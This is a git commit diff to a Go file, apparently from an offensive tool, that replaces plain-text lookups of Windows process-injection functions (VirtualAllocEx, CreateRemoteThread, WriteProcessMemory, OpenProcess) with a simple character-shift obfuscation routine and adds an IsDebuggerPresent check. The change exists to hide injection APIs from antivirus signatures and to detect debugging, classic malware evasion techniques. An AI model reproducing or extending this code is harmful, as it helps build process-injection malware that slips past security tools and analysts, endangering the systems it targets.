bf9ad9b6f86aa5724496dae1df4ddaf720bfabb9
Ege Balcı <egebal1996@gmail.com>
2016-08-22 16:41:52 +0300

    Update Variables.go

--- RSE/Variables.go
+++ RSE/Variables.go
@@ -13,8 +13,19 @@ const PROCESS_VM_OPERATION = 0x0008
 const PROCESS_VM_WRITE = 0x0020
 const PROCESS_VM_READ = 0x0010
 
-var	K32 = syscall.MustLoadDLL("kernel32.dll")
-var VirtualAllocEx = K32.MustFindProc("VirtualAllocEx")
-var CreateRemoteThread = K32.MustFindProc("CreateRemoteThread")
-var WriteProcessMemory = K32.MustFindProc("WriteProcessMemory")
-var OpenProcess = K32.MustFindProc("OpenProcess")
+
+func DeObfuscate(Data string) (string){
+	var ClearText string
+	for i := 0; i < len(Data); i++ {
+		ClearText += string(int(Data[i])-1)
+	}
+	return ClearText
+}
+
+var	K32 = syscall.MustLoadDLL(DeObfuscate("lfsofm43/emm"))//kernel32.dll
+var USER32 = syscall.MustLoadDLL(DeObfuscate("vtfs43/emm"))//user32.dll
+var VirtualAllocEx = K32.MustFindProc(DeObfuscate("WjsuvbmBmmpdF"))//VirtualAllocEx
+var CreateRemoteThread = K32.MustFindProc(DeObfuscate("DsfbufSfnpufUisfbe"))//CreateRemoteThread
+var WriteProcessMemory = K32.MustFindProc(DeObfuscate("XsjufQspdfttNfnpsz"))//WriteProcessMemory
+var OpenProcess = K32.MustFindProc(DeObfuscate("PqfoQspdftt"))//OpenProcess
+var IsDebuggerPresent = K32.MustFindProc(DeObfuscate("JtEfcvhhfsQsftfou"))
